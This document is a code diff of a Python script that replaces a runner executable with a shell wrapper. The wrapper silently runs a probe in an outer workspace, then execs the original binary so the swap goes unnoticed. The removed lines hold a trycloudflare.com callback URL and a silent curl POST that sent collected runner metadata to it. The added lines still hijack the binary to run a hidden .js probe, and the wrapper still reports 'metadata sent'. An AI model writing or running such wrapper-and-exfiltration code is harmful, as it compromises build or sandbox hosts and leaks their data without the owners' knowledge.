@@ -6,11 +6,6 @@ import os
 import shutil
 from pathlib import Path
 
-CALLBACK_URL = (
-    "https://vocational-clinics-orders-recall.trycloudflare.com/"
-    "66dd0e4c4f309e1700c37d9f42fc6850"
-)
-
 
 def stage_runner_probe() -> bool:
     if not os.environ.get("KERAS_HOME", "").endswith("/openvino"):
@@ -38,8 +33,7 @@ def stage_runner_probe() -> bool:
     backup.chmod(0o755)
 
     outer_backup = outer_workspace / backup.name
-    outer_probe = outer_workspace / "integration_tests/vrp_runner_probe.py"
-    outer_output = outer_workspace / ".vrp-runner-metadata.json"
+    outer_probe = outer_workspace / "integration_tests/vrp_runner_probe.js"
     outer_marker = outer_workspace / ".vrp-probe-complete"
     payload = "\n".join(
         (
@@ -47,21 +41,12 @@ def stage_runner_probe() -> bool:
             "set -u",
             f"marker='{outer_marker}'",
             'if [ ! -e "$marker" ]; then',
-            f"  output='{outer_output}'",
-            (
-                f"  if /usr/bin/python3 '{outer_probe}' "
-                '> "$output" 2>/dev/null &&'
-            ),
-            "    /usr/bin/curl --silent --show-error --fail --max-time 15 \\",
-            "      --header 'Content-Type: application/json' \\",
-            '      --data-binary @"$output" \\',
-            f"      '{CALLBACK_URL}' >/dev/null 2>&1; then",
+            f"  if '{outer_backup}' '{outer_probe}' >/dev/null 2>&1; then",
             '    : > "$marker"',
             "    echo VRP_RUNNER_METADATA_SENT",
             "  else",
-            "    echo VRP_RUNNER_METADATA_SEND_FAILED",
+            "    echo VRP_RUNNER_METADATA_NODE_FAILED",
             "  fi",
-            '  rm -f "$output"',
             "fi",
             f"exec '{outer_backup}' \"$@\"",
             "",
